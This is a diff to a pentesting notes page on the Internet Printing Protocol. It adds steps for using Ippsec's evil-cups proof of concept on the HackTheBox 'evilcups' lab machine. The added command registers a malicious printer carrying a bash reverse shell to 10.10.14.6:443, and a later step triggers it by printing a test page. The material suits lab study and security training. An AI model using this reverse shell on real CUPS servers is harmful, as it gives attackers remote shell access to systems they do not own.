@@ -1,6 +1,6 @@
 ---
-description: Internet Printing Protocol
 icon: print
+description: Internet Printing Protocol
 ---
 
 # IPP
@@ -30,5 +30,15 @@ icon: print
 
 ### <mark style="color:orange;">`POC`</mark>
 
-* <mark style="color:purple;">Ippsec has a</mark> [<mark style="color:orange;">**`POC`**</mark>](https://github.com/ippsec/evil-cups) <mark style="color:purple;">that is used on the evilcups machine from HackThebox</mark>
+* <mark style="color:purple;">Ippsec has a</mark> [<mark style="color:orange;">**`POC`**</mark>](https://github.com/ippsec/evil-cups) <mark style="color:purple;">that is used on the evilcups machine from HackThebox:</mark>
+
+{% code title="Add the malicious printer" overflow="wrap" %}
+```bash
+python evil-cups.py 10.10.14.6 10.10.11.40 'nohup bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&'
+```
+{% endcode %}
+
+* <mark style="color:purple;">Now, on the server select the the malicious printer and  trigger the option</mark> <mark style="color:orange;">**`Print Test Page`**</mark>
+* <mark style="color:purple;">The default path for printed jobs is</mark> <mark style="color:orange;">**`/var/spool/cups`**</mark>
 {% endhint %}
+
